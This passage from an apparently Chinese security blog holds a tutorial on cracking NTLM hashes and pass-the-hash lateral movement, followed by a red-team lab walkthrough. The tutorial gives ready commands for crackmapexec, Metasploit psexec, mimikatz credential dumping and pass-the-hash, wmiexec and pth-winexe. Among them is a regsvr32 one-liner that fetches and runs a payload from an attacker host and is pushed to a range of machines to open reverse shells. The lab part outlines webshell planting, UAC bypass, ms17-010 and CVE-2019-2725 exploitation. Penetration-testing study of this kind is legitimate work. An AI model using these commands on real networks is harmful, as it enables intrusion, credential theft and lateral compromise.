rel="noopener">花式窃取NetNTLM哈希的方法</a></p><h3 id="四、如何利用Hash？"><a href="#四、如何利用Hash？" class="headerlink" title="四、如何利用Hash？"></a>四、如何利用Hash？</h3><p>在拿到hash之后，我们一般会考虑破解出hash明文密码，或者利用<code>pass-the-hash</code>技术在无需明文密码的情况下进行特权操作。</p><h4 id="1-解密Hash"><a href="#1-解密Hash" class="headerlink" title="1.解密Hash"></a>1.解密Hash</h4><h5 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h5><p>下面是一些提供在线解密的站点：</p><ul><li><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></li><li><a href="https://crack.sh/get-cracking/" target="_blank" rel="noopener">https://crack.sh/get-cracking/</a></li><li><a href="http://hashcrack.com/index.php" target="_blank" rel="noopener">http://hashcrack.com/index.php</a></li><li><a href="http://cracker.offensive-security.com/index.php" target="_blank" rel="noopener">http://cracker.offensive-security.com/index.php</a></li><li><a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a></li></ul><h5 id="本地破解"><a href="#本地破解" class="headerlink" title="本地破解"></a>本地破解</h5><p>我们还可以使用<code>john</code>、<code>hashcat</code>等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。</p><h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john HTTP-NTLMv2-17.10.0.10.txt</span><br></pre></td></tr></table></figure><h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>使用<code>hashcat -h</code>命令查看帮助，必要的参数有：</p><p><code>-m</code>  hash类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LM：3000 </span><br><span class="line">NTLM：1000</span><br><span class="line">NetNTLMv1：5500</span><br><span class="line">NetNTLMv2：5600</span><br></pre></td></tr></table></figure><p>NTLMv1的格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure><p>构造后的数据如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee</span><br></pre></td></tr></table></figure><p>Hashcat参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure><p>下面，使用Hashcat对该Net-NTLM hash进行破解。NTLMv2的格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><blockquote><p>值得一提的是，在真实渗透环境下，由于密码复杂度限制，一般我们获取到的<code>NTML-HASH</code>很难直接破解出明文密码，这种情况下我们需要采用其他技术继续进行横向渗透。</p></blockquote><h4 id="2-Pass-The-Hash"><a href="#2-Pass-The-Hash" class="headerlink" title="2.Pass-The-Hash"></a>2.Pass-The-Hash</h4><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。渗透中当我们获取不到明文密码，或者破解不了NTLM Hash的情况下，哈希传递攻击能够使我们利用这些哈希继续进行横向渗透。</p><p>常用<code>Pass-The-Hash</code>工具： </p><ul><li>Crackmapexec</li><li>Mimikatz</li><li>smbmap</li><li>smbexec</li><li>metasploit</li><li>cobaltstrike</li></ul><h5 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></h5><p>1.安装 crackmapexec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br><span class="line">(pip install crackmapexec)</span><br></pre></td></tr></table></figure><p>2.使用 crackmapexec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb -h</span><br></pre></td></tr></table></figure><p>批量扫描探测命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>/<span class="number">24</span></span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span> -u administrator -H hash.txt</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.100</span><span class="number">-200</span> -u administrator -H AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -p toor(明文密码) -x whoami</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -H afc44ee7351d61d00698796da06b1ebf -x whoami</span><br></pre></td></tr></table></figure><p>其他参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">--shares    <span class="comment">#枚举共享和访问权限</span></span><br><span class="line">--sessions    <span class="comment">#枚举活动会话</span></span><br><span class="line">--disks        <span class="comment">#枚举磁盘</span></span><br><span class="line">--sam         <span class="comment">#dump目标系统中的SAM哈希值</span></span><br><span class="line">--loggedon-users    <span class="comment">#枚举登录用户</span></span><br><span class="line">--users [USER]        <span class="comment">#枚举域用户(如果指定了用户只查询其信息)</span></span><br><span class="line">--groups [GROUP]        <span class="comment">#枚举域组(如果指定了组其成员被列举)</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]  <span class="comment">#如果指定了组则枚举本地组其成员被列举</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]    <span class="comment">#枚举本地组，如果指定了组，则枚举其成员</span></span><br><span class="line">-x COMMAND                <span class="comment">#执行指定的命令</span></span><br><span class="line">-X PS_COMMAND            <span class="comment">#执行指定的PowerShell命令</span></span><br><span class="line"></span><br><span class="line">-L， --list-modules    <span class="comment">#列出可用的拓展功能模块</span></span><br><span class="line">--options    <span class="comment">#查看模块选项</span></span><br><span class="line">-M MODULE， --module MODULE     <span class="comment">#使用拓展功能模块</span></span><br><span class="line">-o MODULE_OPTION [MODULE_OPTION ...] <span class="comment">#设置模块选项</span></span><br></pre></td></tr></table></figure><p>GETSHELL</p><p>利用拓展功能模块，我们可以方便地getshell。我们可以使用<code>cme smb -L</code>命令查看所有<code>moudules</code>，对应的物理路径为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python2<span class="number">.7</span>/dist-packages/crackmapexec<span class="number">-4.0</span><span class="number">.1</span>.dev0-py2<span class="number">.7</span>.egg/cme/modules</span><br></pre></td></tr></table></figure><p>其中提供的<code>met_inject.py</code>模块可以使目标下载执行<code>Meterpreter stager</code>，我们先来看下模块需要的参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cme smb -M met_inject --options</span><br><span class="line">[*] met_inject module options:</span><br><span class="line">    LHOST    IP hosting the handler</span><br><span class="line">    LPORT    Handler port</span><br><span class="line">    PAYLOAD  Payload to inject: reverse_http or reverse_https (default:reverse_https)</span><br><span class="line">    PROCID   Process ID to inject into (default: current powershell process)</span><br></pre></td></tr></table></figure><p>这是一个<code>http</code>或<code>https</code>的反弹shell，我们使用默认的<code>reverse_https</code>，提供需要的<code>LHOST</code>和<code>LPORT</code>的参数即可：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme<span class="built_in"> smb </span>17.10.0.10-150 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -M met_inject -o <span class="attribute">LHOST</span>=17.10.0.1 <span class="attribute">LPORT</span>=9999</span><br></pre></td></tr></table></figure><p>命令的意思是通过pass-the-hash批量攻击<code>17.10.0.10-17.10.0.150</code>网段的主机，并使其执行meterpreter的https反弹shell。</p><p>笔者测试时遇到问题，无法用<code>met_inject.py</code>模块正常getshell，不知道什么原因。因此选择直接通过命令执行getlshell。利用metasploit的<code>web_delivery</code>模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 17.10.0.1</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line"><span class="built_in">set</span> target 3</span><br><span class="line">run</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Started reverse TCP handler on 17.10.0.1:9999 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/1KZkey</span><br><span class="line">[*] Local IP: http://10.204.146.152:8080/1KZkey</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll</span><br></pre></td></tr></table></figure><p>通过pass-the-hash执行命令批量getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x <span class="string">"regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll"</span></span><br></pre></td></tr></table></figure><h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">Metasploit</a></h5><p>search <code>psexec</code>，<code>smblogin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec_psh</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure><p>举例：</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h5><p>先抓取hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords<span class="string">""</span></span><br></pre></td></tr></table></figure><p>得到hash之后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:ssooking-pc /ntlm:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure><h5 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a></h5><p>exe 版本下载<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">链接</a></p><p>windows 管理规范<code>WMI</code>，实际上就是windows从<code>03/XP</code>开始就内置了这个系统插件。其设计初衷之一是为了管理员能更加方便的对远程windows主机进行各种日常管理。</p><p>严格来说它其实是为各种服务提供一个统一的调用接口，比如你想操作什么服务就去调用对应的服务类中的方法去执行你的操作。在渗透测试中，它意味着我们可以直接在本地操作远程目标机器上的进程、服务、注册表等包括其它一系列特权操作，wmi是一把在目标内网进行横向移动的非常趁手的武器。<code>wmiexec</code>是一个python2脚本，对windows自带的wmic做了一些强化，让渗透变得更容易。</p><p>只能说很多工具吧，比较好用的在这里介绍两种：</p><p>wmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为<code>LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure><h5 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h5><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/" target="_blank" rel="noopener">Invoke-WMIExec</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> <span class="number">17.10</span>.<span class="number">0.10</span> <span class="literal">-Domain</span> test.local <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> AFC44EE7351D61D00698796DA06B1EBF <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure><p>Invoke-SMBExec</p><p>通过在目标主机创建服务执行命令，所以权限为system</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> <span class="number">192.168</span>.<span class="number">0.2</span> <span class="literal">-Domain</span> ssookinging<span class="literal">-pc</span> <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> <span class="number">7</span>ECFFFF0C3548187607A14BAD0F88BB1 <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure><h5 id="Invoke-SMBClient："><a href="#Invoke-SMBClient：" class="headerlink" title="Invoke-SMBClient："></a>Invoke-SMBClient：</h5><p>支持SMB1, SMB2 (2.1), and SMB signing</p><p>如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本</p><p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target 192.168.0.102 -Domain workgroup -Username administrator -Hash 03bebb338e70244589ea67c7439c77ba -Command <span class="string">"notepad.exe"</span> -verbose</span><br></pre></td></tr></table></figure><h5 id="PTH-EXEC"><a href="#PTH-EXEC" class="headerlink" title="PTH-EXEC"></a>PTH-EXEC</h5><p>kali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exe</span><br><span class="line"></span><br><span class="line">pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe</span><br></pre></td></tr></table></figure><h3 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h3><p>结合攻击方法，总结防御思路如下：</p><ul><li>检查特殊文件.scf 和 desktop.ini，避免被添加UNC路径</li><li>如无特殊需要，建议配置防火墙规则禁止139和445端口</li></ul><h3 id="六、后渗透思路拓展"><a href="#六、后渗透思路拓展" class="headerlink" title="六、后渗透思路拓展"></a>六、后渗透思路拓展</h3><ul><li>内网欺骗劫持</li><li>钓鱼文件</li><li>后门命令</li><li>拿下一台文件服务器后，在上面创建图标、desktop.ini、link、url等</li><li><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">pass the hash with RDP</a></li><li>获取域控</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; run post/windows/gather/credentials/gpp</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;转载自:&lt;/strong&gt;&lt;a href=&quot;https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ssooking.gith
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="NTML" scheme="https://shu1l.github.io/tags/NTML/"/>
    
  </entry>
  
  <entry>
    <title>红日安全ATT&amp;CK靶场总结</title>
    <link href="https://shu1l.github.io/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/"/>
    <id>https://shu1l.github.io/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/</id>
    <published>2020-06-05T14:11:40.000Z</published>
    <updated>2020-11-25T09:24:07.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="红日安全ATT-amp-CK靶场-一"><a href="#红日安全ATT-amp-CK靶场-一" class="headerlink" title="红日安全ATT&amp;CK靶场(一)"></a>红日安全ATT&amp;CK靶场(一)</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文只记录打靶机过程的思路，因为我也是基本按照其他师傅的过程学习的，所以具体的过程可以去看其他师傅的文章。这里只记录下思路与过程。</p><h3 id="红队实战-一）："><a href="#红队实战-一）：" class="headerlink" title="红队实战(一）："></a>红队实战(一）：</h3><h5 id="详细教程："><a href="#详细教程：" class="headerlink" title="详细教程："></a>详细教程：</h5><p><a href="https://www.freebuf.com/column/230476.html" target="_blank" rel="noopener">https://www.freebuf.com/column/230476.html</a></p><p><a href="https://www.freebuf.com/column/230725.html" target="_blank" rel="noopener">https://www.freebuf.com/column/230725.html</a></p><p><strong>拓扑结构：</strong></p><p><img src="t018915c37beca70abc.png" alt=""></p><h4 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透:"></a>外网渗透:</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一:"></a>思路一:</h5><ul><li><strong>nmap探测存活主机和端口，发现80开放。</strong></li></ul><p>​        <a href="https://blog.csdn.net/qq_37964989/article/details/84330693" target="_blank" rel="noopener">nmap常用命令总结</a></p><ul><li><strong>御剑、或dirmap、dirsearch等进行目录扫描</strong></li></ul><p>我用的dirmap,可以几个都试试:<a href="https://github.com/H4ckForJob/dirmap" target="_blank" rel="noopener">https://github.com/H4ckForJob/dirmap</a></p><ul><li><strong>识别网站指纹，发现为yxcms。</strong><ul><li>云悉指纹:<a href="https://www.yunsee.cn/" target="_blank" rel="noopener">https://www.yunsee.cn/</a></li><li>潮汐指纹:<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></li><li>who ami:<a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></li></ul></li><li><strong>搜索yxcms网站漏洞，找到默认后台，弱口令成功登录。</strong></li></ul><p>​          <a href="https://www.freebuf.com/column/162886.html" target="_blank" rel="noopener">yxcms app 1.4.6 漏洞集合</a></p><ul><li><strong>yxcms后台，直接在前台index模板中插入一句话木马。</strong></li></ul><p><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">后台拿webshell的方法总结</a></p><ul><li><strong>菜刀连接，即可获得后门</strong></li><li>常见的webshell管理工具<ul><li><a href="https://www.uedbox.com/post/8136/" target="_blank" rel="noopener">中国蚁剑AntSword</a></li><li><a href="https://www.uedbox.com/post/51677/" target="_blank" rel="noopener">中国菜刀 (caidao)</a></li><li><a href="https://www.uedbox.com/post/51031/" target="_blank" rel="noopener">冰蝎 webshell</a></li><li>cknife (c刀)</li><li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">webshell收集i项目</a></li></ul></li></ul><h5 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h5><ul><li><strong>nmap探测存活主机和端口，发现80开放</strong>。</li><li><strong>御剑、或dirmap、dirsearch等进行目录扫描</strong></li><li><strong>发现phpmyadmin,弱口令root，root登录。</strong></li><li><strong>phpmyadmin通过开启全局日志的方式getshell，</strong></li></ul><p>​      <a href="https://www.cnblogs.com/0nc3/p/12071314.html" target="_blank" rel="noopener">[phpmyadmin后台getshell方法学习总结]</a></p><h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul><li><strong>1.使用msfvenom生成payload文件，使用菜刀上传到WWW目录下，msf监听连接。</strong></li></ul><p>​      <a href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/">MSF反弹payload学习</a></p><ul><li><p><strong>查看获得的用户权限，通常通过web漏洞获得的webshell权限较低，需要进行提权。</strong></p><p>windows提权exp： <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a></p></li><li><p><strong>这里直接使用getsystem即可提权</strong>，<strong>如果不成功可以使用msf中自带的绕过UAC模块，设置执行后再次尝试getsystem就可获得权限</strong></p></li></ul><p>​       <a href="https://www.freebuf.com/articles/system/185311.html" target="_blank" rel="noopener">使用Metasploit绕过UAC的多种方法 </a></p><ul><li><strong>然后我们就可以执行一些后渗透的常规姿势，添加管理员，开3389，关防火墙，主机信息收集,后门植入等等</strong></li></ul><p>​       <a href="https://xz.aliyun.com/t/2536#toc-0" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></p><ul><li><p><strong>mimikatz抓取本地用户的hash密码</strong></p><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html" target="_blank" rel="noopener">后渗透]Mimikatz使用大全</a></p></li><li><p><strong>后渗透信息收集</strong>，<strong>包括定位域控，查询域管理员和域用户，添加域管理员等等</strong></p></li><li><p>利用powershell框架进行后渗透信息收集:</p><ul><li><a href="https://www.freebuf.com/sectool/87647.html" target="_blank" rel="noopener">一些值得收藏的PowerShell工具</a></li><li><a href="https://www.secpulse.com/archives/55893.html" target="_blank" rel="noopener">Powershell &amp; Powersploit 入门</a></li><li><a href="https://www.secpulse.com/archives/73766.html" target="_blank" rel="noopener">内网工具学习之Empire后渗透</a></li><li><a href="https://www.cnblogs.com/-qing-/p/10742487.html" target="_blank" rel="noopener">nishang的介绍与使用</a></li><li>域渗透信息收集常见操作<ul><li><a href="https://xz.aliyun.com/t/7777#toc-0" target="_blank" rel="noopener">内网信息收集</a></li></ul></li></ul></li><li><p><strong>根据信息收集，我们可以知道域控的地址，域成员主机03地址。</strong></p></li><li><p><strong>接着进行横向渗透，首先需要添加路由和代理。</strong></p></li></ul><p>​       <a href="https://evoa.me/index.php/archives/37/" target="_blank" rel="noopener">[MSF学习-端口转发代理及路由功能-三层内网靶场渗透]</a></p><ul><li><strong>添加路由成功后，可以根据作者给出的漏洞列表直接用msf里的模块打（服务默认需要手动开启）</strong></li></ul><p><a href="https://p2.ssl.qhimg.com/t0165052491af946555.png" target="_blank" rel="noopener"><img src="D:%5Cblog%5Csource_posts%5C%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8ATT-CK%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93%5Ct0165052491af946555.png" alt="img"></a></p><ul><li><strong>利用ms17-010获取2003机器的shell，这里吐槽下msf自带的模块，就没打成功过。。</strong></li></ul><p>​       这里给一个比较好用的模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="noopener">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a></p><p>​         先知一篇讲永恒之蓝的文章 ： <a href="https://xz.aliyun.com/t/2151#toc-1" target="_blank" rel="noopener">那些年，我们追过的“蓝”</a></p><ul><li><p><strong>2003我们直接getsystem提权，然后照上面操作导出用户hash即可。</strong></p></li><li><p>最后杀向域控，前面我们已经在win7机器上获取了域管理的账号密码。这里直接用</p></li></ul><p>​      <code>exploit/windows/smb/psexec</code>远程连接即可拿到shell，并且是管理员权限。</p><p>​      <a href="https://www.freebuf.com/articles/system/183670.html" target="_blank" rel="noopener">多种使用SMB端口远程连接PC的方法介绍 </a></p><ul><li><strong>植入后门</strong></li><li><strong>痕迹清理</strong></li></ul><h3 id="红队评估（二）"><a href="#红队评估（二）" class="headerlink" title="红队评估（二）"></a>红队评估（二）</h3><h5 id="详细教程"><a href="#详细教程" class="headerlink" title="详细教程"></a>详细教程</h5><p><a href="https://www.anquanke.com/post/id/193193" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193193</a></p><p><a href="https://wh0ale.github.io/2019/12/11/VulnStack" target="_blank" rel="noopener">https://wh0ale.github.io/2019/12/11/VulnStack</a></p><h5 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">内网网段：<span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span></span><br><span class="line">DC</span><br><span class="line">IP：<span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>OS：Windows <span class="number">2012</span>(<span class="number">64</span>)</span><br><span class="line">应用：AD域</span><br><span class="line">WEB</span><br><span class="line">IP1：<span class="number">10.10</span><span class="number">.10</span><span class="number">.80</span></span><br><span class="line">应用：Weblogic <span class="number">10.3</span><span class="number">.6</span>MSSQL <span class="number">2008</span></span><br><span class="line">PC</span><br><span class="line">IP1：<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span></span><br></pre></td></tr></table></figure><p>大体拓扑如下：</p><p><img src="t01bbcd3ad3d53a0ecd.jpg" alt="img"></p><h4 id="外网渗透-1"><a href="#外网渗透-1" class="headerlink" title="外网渗透"></a>外网渗透</h4><ul><li><p><strong>首先手动开启web机上weblogic服务，访问web机的7001端口。可以进入控制台。</strong></p></li><li><p><strong>使用WeblogicScan进行扫描，由扫描结果可知存在CVE-2019-2725</strong>。</p><p><a href="https://github.com/dr0op/WeblogicScan" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11503707.html" target="_blank" rel="noopener">Weblogic漏洞总结</a></p></li><li><p><strong>使用<code>CVE-2019-2725</code>的POC上传webshell，</strong></p></li></ul><p>​    <a href="https://www.cnblogs.com/liliyuanshangcao/p/10820583.html" target="_blank" rel="noopener"><a href="https://www.cnblogs.com/liliyuanshangcao/p/10820583.html" target="_blank" rel="noopener">（CVE-2019-2725）复现</a></a></p><ul><li><strong>或者直接使用msf自带的cve模块打一波，拿到shell.</strong></li><li><strong>或者使用这个脚本</strong>：<a href="https://github.com/TopScrew/CVE-2019-2725" target="_blank" 